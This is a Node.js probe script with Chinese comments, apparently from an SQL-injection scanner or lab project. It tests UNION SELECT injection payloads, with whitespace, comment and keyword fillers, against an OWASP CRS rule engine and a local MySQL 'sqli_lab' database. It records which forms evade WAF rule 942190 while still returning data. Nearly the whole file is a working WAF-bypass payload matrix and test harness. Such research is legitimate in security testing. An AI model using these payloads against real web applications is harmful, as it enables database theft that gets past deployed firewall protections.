// ============================================================================
// e2e/waf-real/probe-union-shape2.mjs —— §I 第 1 条探针（第二版）
//
// 第一版（probe-union-shape.mjs）的结论推翻了两条既有归因：
//   1. 拦我们的**不是** 942361（起始形状），而是 **942190**（PL1，`union\s*select` 短语）；
//   2. 所以「改起始形状」这条路线**方向错了** —— 942190 不看起始，看 union 与 select 的相邻性。
//
// 本版换轴验证：942190 的 union 分支是
//   `union\b[\s\x0b]*(?:all|(?:distin|sele)ct)\b[\s\x0b]*[^\s\x0b]`
//   `union(?:[\s\x0b]select[\s\x0b]@|[\s\x0b\(0-9A-Z_a-z]*?select)`
// 即：必须 union 后面（可隔空白/若干字符）出现 select/distinct/all。
// 若能在 union 与 select 之间插入 **词字符**（不是空白），第一支就断；
// 但第二支 `[\s\x0b\(0-9A-Z_a-z]*?select` 允许字母数字，**插字母反而更毒**。
//
// 因此本版系统扫「union 与 select 之间的填充字符种类」×「注释形态」，逐格看：
//   CRS 拦不拦 / MySQL 认不认 / 标记值能不能取回
// ============================================================================
import { createRequire } from 'node:module';
const require = createRequire(new URL('../../server/package.json', import.meta.url));
const mysql = require('mysql2/promise');
const { evaluate, EFFECTIVE_PL } = await import(new URL('./crs-engine.js', import.meta.url).href);

const DB = process.env.MYSQL_DATABASE || 'sqli_lab';
const POOL = mysql.createPool({
  host: process.env.MYSQL_HOST ?? '127.0.0.1',
  port: Number(process.env.MYSQL_PORT) || 3306,
  user: process.env.MYSQL_USER ?? 'root',
  password: process.env.MYSQL_PASSWORD ?? 'root',
  database: DB,
  multipleStatements: true,
});

const MARKER = 'SQLISCANNEROK';
// 靶场：SELECT id,username FROM users WHERE id=<INJECT>
// 用 SELECT 里的标记值回收验证语义
const TAIL = (mid) => `UNION${mid}SELECT 999,'${MARKER}'-- -`;

// —— 填充矩阵：union 与 select 之间插什么 ——
const FILLERS = [
  { label: '空(空格)', mid: ' ', expect: 'block' },
  { label: 'tab', mid: '\t' },
  { label: '双空格', mid: '  ' },
  { label: '三空格', mid: '   ' },
  { label: '换行', mid: '\n' },
  { label: '垂直tab', mid: '\v' },
  { label: '回车', mid: '\r' },
  { label: 'nbsp', mid: '\u00a0' },
  { label: '/**/', mid: '/**/' },
  { label: '/*a*/', mid: '/*a*/' },
  { label: '/**/空格', mid: '/**/ ' },
  { label: '空格/**/', mid: ' /**/' },
  { label: '/*!*/', mid: '/*!*/' },
  { label: 'x(裸字母)', mid: 'x' },
  { label: '1(数字)', mid: '1' },
  { label: '_', mid: '_' },
  { label: 'ALL', mid: ' ALL ' },
  { label: 'DISTINCT', mid: ' DISTINCT ' },
];

// —— 另一条正交路线：union 大小写/关键字缠绕 ——
const WRAPS = [
  { label: 'UNION SELECT', sql: `1 UNION SELECT 999,'${MARKER}'-- -` },
  { label: 'UNION/**/SELECT', sql: `1 UNION/**/SELECT 999,'${MARKER}'-- -` },
  { label: 'UNION%0aSELECT', sql: `1 UNION\nSELECT 999,'${MARKER}'-- -` },
  { label: 'UNION%09SELECT', sql: `1 UNION\tSELECT 999,'${MARKER}'-- -` },
  { label: 'UNION%0bSELECT', sql: `1 UNION\vSELECT 999,'${MARKER}'-- -` },
  { label: 'UNION%0cSELECT', sql: `1 UNION\fSELECT 999,'${MARKER}'-- -` },
  { label: 'UNION%0dSELECT', sql: `1 UNION\rSELECT 999,'${MARKER}'-- -` },
  { label: 'UNION%20%20SELECT', sql: `1 UNION  SELECT 999,'${MARKER}'-- -` },
  { label: 'UNION%a0SELECT', sql: `1 UNION\u00a0SELECT 999,'${MARKER}'-- -` },
  { label: 'UNION(SELECT)', sql: `1 UNION(SELECT 999,'${MARKER}')-- -` },
  { label: 'UNION ALL SELECT', sql: `1 UNION ALL SELECT 999,'${MARKER}'-- -` },
  { label: 'UNION DISTINCT SELECT', sql: `1 UNION DISTINCT SELECT 999,'${MARKER}'-- -` },
];

async function tryExec(sql) {
  try {
    const [rows] = await POOL.query(sql);
    const j = JSON.stringify(rows);
    return { ok: true, rows, gotMarker: j.includes(MARKER) };
  } catch (e) {
    return { ok: false, err: e.message.slice(0, 60) };
  }
}

function crsVerdict(inject) {
  return evaluate({
    uri: '/num',
    queryString: `id=${encodeURIComponent(inject)}`,
    args: { id: inject },
    cookies: {},
    headers: {},
  });
}

console.log('='.repeat(84));
console.log(`§I 第二版：union↔select 填充矩阵（CRS PL${EFFECTIVE_PL} / 真库 ${DB}）`);
console.log('='.repeat(84));
console.log('判据：CRS 放行 AND MySQL 取回标记值 —— 两者同时成立才算可用形态');
console.log('');

console.log('—— A. union↔select 之间插填充 ——');
console.log(`${'填充'.padEnd(14)} ${'CRS'.padEnd(14)} ${'MySQL'.padEnd(12)} SQL`);
const wins = [];
for (const f of FILLERS) {
  const inject = `1 ${TAIL(f.mid)}`;
  const v = crsVerdict(inject);
  const r = await tryExec(`SELECT id,username FROM users WHERE id=${inject}`);
  const b = !r.ok ? '语法错' : r.gotMarker ? '取回标记' : '跑了无标记';
  const win = !v.blocked && r.gotMarker;
  if (win) wins.push({ ...f, inject, verdict: v });
  console.log(
    `${(win ? '★ ' : '  ') + f.label.padEnd(12)} ${(v.blocked ? `拦${v.ruleId}` : '放').padEnd(14)} ${b.padEnd(12)} ${JSON.stringify(inject)}`
  );
}
console.log('');

console.log('—— B. union/select 关键字缠绕 ——');
console.log(`${'形态'.padEnd(20)} ${'CRS'.padEnd(14)} ${'MySQL'.padEnd(12)} payload`);
for (const w of WRAPS) {
  const v = crsVerdict(w.sql);
  const r = await tryExec(`SELECT id,username FROM users WHERE id=${w.sql}`);
  const b = !r.ok ? '语法错' : r.gotMarker ? '取回标记' : '跑了无标记';
  const win = !v.blocked && r.gotMarker;
  if (win) wins.push({ ...w, inject: w.sql, verdict: v });
  console.log(
    `${(win ? '★ ' : '  ') + w.label.padEnd(18)} ${(v.blocked ? `拦${v.ruleId}` : '放').padEnd(14)} ${b.padEnd(12)} ${JSON.stringify(w.sql)}`
  );
}

console.log('');
console.log('='.repeat(84));
console.log(`可用形态（CRS 放行 + 取回标记）：${wins.length}`);
for (const w of wins) console.log(`  ★ ${w.label}  →  ${JSON.stringify(w.inject)}`);
if (!wins.length) console.log('  （无）');
console.log('='.repeat(84));

await POOL.end();
